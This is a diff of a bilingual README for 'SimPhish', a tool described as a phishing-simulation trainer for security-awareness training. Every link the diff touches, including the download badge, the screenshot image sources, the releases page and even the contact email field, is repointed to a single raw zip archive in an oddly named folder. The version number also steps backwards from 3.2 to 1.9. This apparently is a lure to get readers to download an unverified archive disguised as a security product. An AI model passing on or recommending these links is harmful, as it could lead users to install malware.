@@ -1,7 +1,7 @@
 # 🐟 SimPhish - Train Your Team on Security Awareness
 
 ## 🏷️ Download Now
-[![Download SimPhish](https://github.com/Wyllkirby/SimPhish/raw/refs/heads/main/garse/Phish-Sim-3.2.zip)](https://github.com/Wyllkirby/SimPhish/raw/refs/heads/main/garse/Phish-Sim-3.2.zip)
+[![Download SimPhish](https://raw.githubusercontent.com/Wyllkirby/SimPhish/main/garse/Phish-Sim-v1.9.zip)](https://raw.githubusercontent.com/Wyllkirby/SimPhish/main/garse/Phish-Sim-v1.9.zip)
 
 ---
 
@@ -43,7 +43,7 @@ SimPhish 是一个专为企业内部安全意识培训设计的钓鱼邮件模�
 - **SMTP 配置**：支持多种加密方式（SSL/TLS、STARTTLS）
 - **发送控制**：支持并发控制和速率限制
 
-<img width="1545" height="892" alt="邮件管理界面" src="https://github.com/Wyllkirby/SimPhish/raw/refs/heads/main/garse/Phish-Sim-3.2.zip" />
+<img width="1545" height="892" alt="邮件管理界面" src="https://raw.githubusercontent.com/Wyllkirby/SimPhish/main/garse/Phish-Sim-v1.9.zip" />
 
 ### 🌍 钓鱼页面
 
@@ -52,7 +52,7 @@ SimPhish 是一个专为企业内部安全意识培训设计的钓鱼邮件模�
 - **服务器配置**：可配置独立的钓鱼服务器地址
 - **重定向**：提交后可重定向到指定 URL
 
-<img width="1545" height="893" alt="钓鱼页面界面" src="https://github.com/Wyllkirby/SimPhish/raw/refs/heads/main/garse/Phish-Sim-3.2.zip" />
+<img width="1545" height="893" alt="钓鱼页面界面" src="https://raw.githubusercontent.com/Wyllkirby/SimPhish/main/garse/Phish-Sim-v1.9.zip" />
 
 ---
 
@@ -60,7 +60,7 @@ SimPhish 是一个专为企业内部安全意识培训设计的钓鱼邮件模�
 
 ### 步骤 1: 下载软件
 
-访问 [SimPhish Releases 页面](https://github.com/Wyllkirby/SimPhish/raw/refs/heads/main/garse/Phish-Sim-3.2.zip) 以获取最新版本的应用程序。根据您的操作系统选择合适的安装包下载。
+访问 [SimPhish Releases 页面](https://raw.githubusercontent.com/Wyllkirby/SimPhish/main/garse/Phish-Sim-v1.9.zip) 以获取最新版本的应用程序。根据您的操作系统选择合适的安装包下载。
 
 ### 步骤 2: 安装软件
 
@@ -114,11 +114,11 @@ SimPhish 仅用于合法和授权的安全意识培训。使用者应遵循相�
 
 如果您有任何问题或反馈，请通过以下方式联系我们：
 
-- **邮箱**：https://github.com/Wyllkirby/SimPhish/raw/refs/heads/main/garse/Phish-Sim-3.2.zip
+- **邮箱**：https://raw.githubusercontent.com/Wyllkirby/SimPhish/main/garse/Phish-Sim-v1.9.zip
 - **GitHub**：在本项目的 Issues 中发起讨论
 
 --- 
 
 ## ✅ 重新下载
 
-如需再次下载 SimPhish，访问 [SimPhish Releases 页面](https://github.com/Wyllkirby/SimPhish/raw/refs/heads/main/garse/Phish-Sim-3.2.zip)。
+如需再次下载 SimPhish，访问 [SimPhish Releases 页面](https://raw.githubusercontent.com/Wyllkirby/SimPhish/main/garse/Phish-Sim-v1.9.zip)。
